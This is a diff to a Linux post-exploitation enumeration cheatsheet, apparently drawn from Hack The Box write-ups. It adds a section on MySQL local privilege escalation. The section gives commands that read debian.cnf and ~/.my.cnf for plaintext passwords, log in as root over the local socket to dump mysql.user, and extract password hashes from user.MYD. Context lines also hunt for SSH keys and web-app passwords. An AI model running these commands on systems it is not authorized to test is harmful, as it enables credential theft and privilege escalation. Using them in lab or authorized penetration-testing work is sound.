@@ -3,8 +3,8 @@ title: "Linux Post-Exploitation Enumeration Cheatsheet"
 type: cheatsheet
 tags: [cheatsheet, enumeration, htb, linux, post-exploitation, privilege-escalation]
 date_created: 2026-05-12
-date_updated: 2026-05-12
-sources: [git-htb-writeups]
+date_updated: 2026-07-14
+sources: [git-htb-writeups, hacktricks-network]
 ---
 
 # Linux Post-Exploitation Enumeration Cheatsheet
@@ -203,6 +203,35 @@ find / -name "id_rsa" 2>/dev/null          # SSH keys
 grep -ri "password" /var/www/ 2>/dev/null  # web app creds
 uname -r                                   # kernel for exploit search
 ```
+
+## MySQL local privilege escalation via auth_socket and client credential files
+
+With shell access on a MySQL host, the fastest wins are the local socket plus auth
+plugins and client cred files, not remote brute force. An account using
+auth_socket/unix_socket lets the matching OS user log in over the local socket with no
+DB password; readable debian.cnf or ~/.my.cnf hand you creds outright.
+
+```bash
+# Client cred files and the local socket
+ls -l /run/mysqld/mysqld.sock /etc/mysql/debian.cnf ~/.my.cnf ~/.mylogin.cnf 2>/dev/null
+cat /etc/mysql/debian.cnf     # plaintext debian-sys-maint password
+
+# Inspect auth plugins and effective identity over the socket
+mysql -S /run/mysqld/mysqld.sock -u root -e \
+  "SELECT user,host,plugin,account_locked FROM mysql.user; SELECT USER(),CURRENT_USER();"
+
+# Posture checks that reveal file-read/write primitives
+mysql -S /run/mysqld/mysqld.sock -u root -e \
+  "SHOW VARIABLES LIKE 'secure_file_priv'; SHOW VARIABLES LIKE 'local_infile';"
+
+# Offline: hashes live in the MYD file if the DB is down
+grep -oaE "[-_.*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v mysql_native_password
+```
+
+Look for auth_socket/unix_socket on privileged users, empty secure_file_priv, and
+local_infile enabled where it is not needed.
+
+---
 
 ## See Also
 
